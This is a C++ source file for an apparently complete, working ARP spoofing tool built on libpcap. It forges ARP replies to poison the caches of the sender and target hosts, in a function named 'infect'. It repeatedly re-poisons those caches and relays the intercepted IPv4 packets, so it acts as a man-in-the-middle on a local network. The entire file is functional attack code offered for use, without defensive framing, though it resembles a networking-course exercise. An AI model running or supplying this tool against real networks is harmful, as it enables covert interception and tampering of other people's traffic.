#include <pcap.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <vector>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

struct Flow {
    Ip SIp;
    Mac SMac;
    Ip TIp;
    Mac TMac;
    Flow* next;
};

bool getInterfaceInfo(int fd, const char* dev, int request, struct ifreq* ifr) {
    memset(ifr, 0, sizeof(struct ifreq));
    strncpy(ifr->ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(fd, request, ifr) < 0) {
        perror("ioctl");
        return false;
    }

    return true;
}

void sendArpPacket(pcap_t* handle, Mac ethDst, Mac ethSrc, uint16_t oper, Mac SMac, Ip SIp, Mac TMac, Ip TIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = ethDst;
    packet.eth_.smac_ = ethSrc;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(oper);
    packet.arp_.smac_ = SMac;
    packet.arp_.sip_ = htonl(uint32_t(SIp));
    packet.arp_.tmac_ = TMac;
    packet.arp_.tip_ = htonl(uint32_t(TIp));

    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
}

bool resolveMac(pcap_t* handle, Mac myMac, Ip myIp, Ip TIp, Mac& resultMac) {
    sendArpPacket(handle, Mac::broadcastMac(), myMac, ArpHdr::Request, myMac, myIp, Mac::nullMac(), TIp);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res <= 0) continue;

        EthHdr* eth = (EthHdr*)packet;
        if (eth->type() != EthHdr::Arp) continue;

        ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
        if (arp->op() != ArpHdr::Reply) continue;
    	if (arp->sip() != TIp) continue;

        resultMac = arp->smac();
        return true;
    }

    return false;
}

void infect(pcap_t* handle, Flow* flow, Mac myMac) {
    sendArpPacket(handle, flow->SMac, myMac, ArpHdr::Reply, myMac, flow->TIp, flow->SMac, flow->SIp);
}

void relay(pcap_t* handle, const u_char* packet, int len, Mac myMac, Mac TMac) {
    std::vector<u_char> buf(packet, packet + len);

    EthHdr* eth = (EthHdr*)buf.data();
    eth->smac_ = myMac;
    eth->dmac_ = TMac;

    pcap_sendpacket(handle, buf.data(), len);
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        printf("pcap_open_live(%s) failed - %s\n", dev, errbuf);
        return -1;
    }

    struct ifreq ifr;
    Mac myMac;
    Ip myIp;

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        pcap_close(handle);
        return -1;
    }

    if (!getInterfaceInfo(fd, dev, SIOCGIFHWADDR, &ifr)) {
        close(fd);
        pcap_close(handle);
        return -1;
    }
    myMac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);

    if (!getInterfaceInfo(fd, dev, SIOCGIFADDR, &ifr)) {
        close(fd);
        pcap_close(handle);
        return -1;
    }
    myIp = Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));

    close(fd);

    Flow* head = nullptr;
    Mac SMac, TMac;
    
    for (int i = 2; i < argc; i += 2) {
        Ip SIp(argv[i]);
        Ip TIp(argv[i + 1]);

        if (!resolveMac(handle, myMac, myIp, SIp, SMac)) {
            printf("failed to resolve sender mac: %s\n", argv[i]);

            while (head != nullptr) {
                Flow* next = head->next;
                delete head;
                head = next;
            }

            pcap_close(handle);
            return -1;
        }

        if (!resolveMac(handle, myMac, myIp, TIp, TMac)) {
            printf("failed to resolve target mac: %s\n", argv[i + 1]);

            while (head != nullptr) {
                Flow* next = head->next;
                delete head;
                head = next;
            }

            pcap_close(handle);
            return -1;
        }

        Flow* flow2 = new Flow;
        flow2->SIp = TIp;
        flow2->SMac = TMac;
        flow2->TIp = SIp;
        flow2->TMac = SMac;
        flow2->next = nullptr;

        Flow* flow = new Flow;
        flow->SIp = SIp;
        flow->SMac = SMac;
        flow->TIp = TIp;
        flow->TMac = TMac;
        flow->next = flow2;
        
        if (head == nullptr) {
            head = flow;
        } else {
            Flow* cur = head;
            while (cur->next != nullptr)
                cur = cur->next;
            cur->next = flow;
        }

        infect(handle, flow, myMac);
        infect(handle, flow2, myMac);
    }

    int cnt = 0;

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res <= 0) continue;

        EthHdr* eth = (EthHdr*)packet;
        uint16_t type = eth->type();

        if (type != EthHdr::Arp && type != EthHdr::Ip4) continue;
        if (eth->smac() == myMac) continue;

        Flow* cur = head;
        while (cur != nullptr) {
            if (type == EthHdr::Arp) {
                ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));

                if (arp->sip() == cur->TIp && arp->tip() == cur->SIp)
                    infect(handle, cur, myMac);

                if (arp->sip() == cur->SIp && arp->tip() == cur->TIp)
                    infect(handle, cur, myMac);
            }

            if (type == EthHdr::Ip4) {
                if (eth->smac() == cur->SMac && eth->dmac() == myMac)
                    relay(handle, packet, header->caplen, myMac, cur->TMac);
            }

            cur = cur->next;
        }

        cnt++;
        if (cnt == 5) {
            Flow* cur = head;
            while (cur != nullptr) {
                infect(handle, cur, myMac);
                cur = cur->next;
            }
            cnt = 0;
        }
    }
}
